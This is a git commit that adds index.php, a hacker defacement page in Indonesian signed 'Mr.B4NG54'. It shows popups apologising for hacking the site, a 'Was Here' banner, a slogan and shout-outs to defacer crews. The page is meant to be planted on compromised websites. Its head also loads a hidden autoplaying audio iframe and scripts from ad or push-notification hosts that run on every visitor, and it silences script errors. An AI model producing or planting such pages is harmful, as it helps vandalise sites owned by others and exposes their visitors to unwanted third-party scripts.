2451e12e83ca9a2b14aa7cc8a0a8a3ec41f96885
B4NG54 <44745570+B4NG54@users.noreply.github.com>
2018-11-04 18:38:30 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,75 @@
+<html>
+<head>
+<iframe width="0%" height="0" scrolling="no" frameborder="no" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/424213563&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;visual=true"></iframe><!-- --> <script type='text/javascript' src='//go.pub2srv.com/apu.php?zoneid=16780'> </script> <script type="text/javascript" src="//1phads.com/notice.php?p=16781&interactive=1&pushup=1"> </script> 
+<title>Touch By Mr.B4NG54</title>
+<script>
+alert("maaf jika saya");
+alert("meretas web anda")
+alert("saya tidak bermaksud jahat")
+alert("tapi saya ingin menyampaikan pesan saya")
+alert("lewat dunia maya")
+alert("dan saya ingin")
+alert("anda untuk memperbaiki kelemahan web anda!!")
+</script>
+<link href='https://img4.uploadhouse.com/fileuploads/26648/266489742372eef20a7609fce64f300f6c7959ae.jpg' rel='icon' type='image/x-icon'/>
+</head>
+<body bgcolor="black">
+<center><img src="https://img4.uploadhouse.com/fileuploads/26648/266489742372eef20a7609fce64f300f6c7959ae.jpg" width="630" height"700"><center>
+<style>
+      h1 {
+    color: #19abff;
+    font-size: 40px;
+    margin: 1px auto;
+    text-align:center;
+    text-transform:uppercase;
+        }
+    .neon {
+    color: #FFFFFF;
+    text-shadow: 0 0 5px #19abff, 0 0 10px #19abff, 0 0 20px #19abff, 0 0 45px #19abff, 0 0 40px #19abff;
+    }
+    </style>
+<script language="JavaScript1.2">
+function ClearError() {return true;}
+window.onerror = ClearError;
+</script>
+<script>
+window.onload = function() {
+var h1 = document.getElementsByTagName("h1")[0],
+text = h1.innerText || h1.textContent,
+split = [], i, lit = 0, timer = null;
+for(i = 0; i < text.length; ++i) {
+split.push("<span>" + text[i] + "</span>");
+}
+h1.innerHTML = split.join("");
+split = h1.childNodes;
+
+var flicker = function() {
+lit += 0.01;
+if(lit >= 1) {
+clearInterval(timer);
+}
+for(i = 0; i < split.length; ++i) {
+if(Math.random() < lit) {
+split[i].className = "neon";
+} else {
+split[i].className = "";
+}
+}
+}
+setInterval(flicker, 100);
+}
+</script>
+<br><br>
+<h1>Mr.B4NG54 Was Here</h1>
+<br>
+<center><font face="Courier new" size="100" color="white">Ini Itu Hati Bukan Rumah Sakit Yang Hanya Sekedar Singgah Saat Sakit Dan Pergi Setelah Sembuh</font>
+<center><font face="Courier new" size="15" color="blue">~Yang Tersakiti
+Akan
+Tetap Tersakiti~</font>
+<br>
+<center><font color="lime"><font size="3"><blank>Thanks To:</blank></font></font></center>
+<br>
+<marquee behavior="scroll" direction="right" scrollamount="4" scrolldelay="55" width="100%">
+<font face="Courier New" size="7" font style="text-shadow: 0px 0px 20px red;" color="white"> <b>|Mr.BURKICEL|Mr.Chiken|Mr.Ndoel|Mr.KR_86|Mr.DRX1|Mr.[ADM]|Mr.D1Ee|Mr.B4NG54|Mr.GDXX6|LocalGhost|Mr.r1i14z|Mr.K3p°0|Mr.G08L0K|Mr.L10n3|</font>
+<font face="Courier New" color="red" size="7">-Newbie Defacer Team-Situbondo Cyber Army-Zero Cyber-MuslimDefacerT3AM-Hacker Cyber Indonesia-</font>
+</html>
